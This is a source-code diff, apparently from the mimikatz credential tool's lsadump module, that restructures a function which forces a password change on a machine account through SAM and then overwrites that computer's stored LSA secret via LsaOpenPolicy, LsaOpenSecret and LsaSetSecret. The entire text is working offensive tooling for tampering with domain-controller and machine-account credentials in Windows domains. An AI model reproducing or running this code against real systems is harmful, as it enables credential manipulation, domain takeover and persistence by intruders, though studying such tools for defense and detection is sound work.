@@ -2600,37 +2600,34 @@ NTSTATUS kuhl_m_lsadump_update_dc_password(int argc, wchar_t * argv[])
 		if(kull_m_string_args_byName(argc, argv, L"account", &szAccount, NULL))
 		{
 			RtlInitUnicodeString(&AccoutName, szAccount);
-			kprintf(L"Account: %wZ\n", &AccoutName);
+			kprintf(L"Account: %wZ\n\n* SAM information\n\n", &AccoutName);
+			status = kuhl_m_lsadump_enumdomains_users_data(&Target, &AccoutName, 0, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_update_dc_password_callback, (PVOID) &uMachineAccountPassword);
+			if(status == STATUS_SUCCESS)
+			{
+				kprintf(L"\n* Computer stored password\n\n");
+				status = LsaOpenPolicy(&Target, &ObjectAttributes, POLICY_CREATE_SECRET, &hPolicy);
+				if(status == STATUS_SUCCESS)
+				{
+					status = LsaOpenSecret(hPolicy, (PLSA_UNICODE_STRING) &uMachineSecretName, SECRET_SET_VALUE, &hSecret);
+					if(status == STATUS_SUCCESS)
+					{
+						status = LsaSetSecret(hSecret, (PLSA_UNICODE_STRING) &uMachineAccountPassword, (PLSA_UNICODE_STRING) &uMachineAccountPassword);
+						if(status == STATUS_SUCCESS)
+						{
+							kprintf(L"  > Password updated (to %wZ)\n", &uMachineAccountPassword);
+						}
+						else PRINT_ERROR(L"LsaSetSecret: 0x%08x\n", status);
+						LsaClose(hSecret);
+					}
+					else PRINT_ERROR(L"LsaOpenSecret: 0x%08x\n", status);
+					LsaClose(hPolicy);
+				}
+				else PRINT_ERROR(L"LsaOpenPolicy: 0x%08x\n", status);
+			}
 		}
 		else PRINT_ERROR(L"A /account argument is needed\n");
 	}
 	else PRINT_ERROR(L"A /server argument is needed\n");
-
-	kprintf(L"\n* SAM information\n\n");
-	status = kuhl_m_lsadump_enumdomains_users_data(&Target, &AccoutName, 0, USER_FORCE_PASSWORD_CHANGE, kuhl_m_lsadump_update_dc_password_callback, (PVOID) &uMachineAccountPassword);
-	if(status == STATUS_SUCCESS)
-	{
-		kprintf(L"\n* Computer stored password\n\n");
-		status = LsaOpenPolicy(&Target, &ObjectAttributes, POLICY_CREATE_SECRET, &hPolicy);
-		if(status == STATUS_SUCCESS)
-		{
-			status = LsaOpenSecret(hPolicy, (PLSA_UNICODE_STRING) &uMachineSecretName, SECRET_SET_VALUE, &hSecret);
-			if(status == STATUS_SUCCESS)
-			{
-				status = LsaSetSecret(hSecret, (PLSA_UNICODE_STRING) &uMachineAccountPassword, (PLSA_UNICODE_STRING) &uMachineAccountPassword);
-				if(status == STATUS_SUCCESS)
-				{
-					kprintf(L"  > Password updated (to %wZ)\n", &uMachineAccountPassword);
-				}
-				else PRINT_ERROR(L"LsaSetSecret: 0x%08x\n", status);
-
-				LsaClose(hSecret);
-			}
-			else PRINT_ERROR(L"LsaOpenSecret: 0x%08x\n", status);
-			LsaClose(hPolicy);
-		}
-		else PRINT_ERROR(L"LsaOpenPolicy: 0x%08x\n", status);
-	}
 
 	return STATUS_SUCCESS;
 }
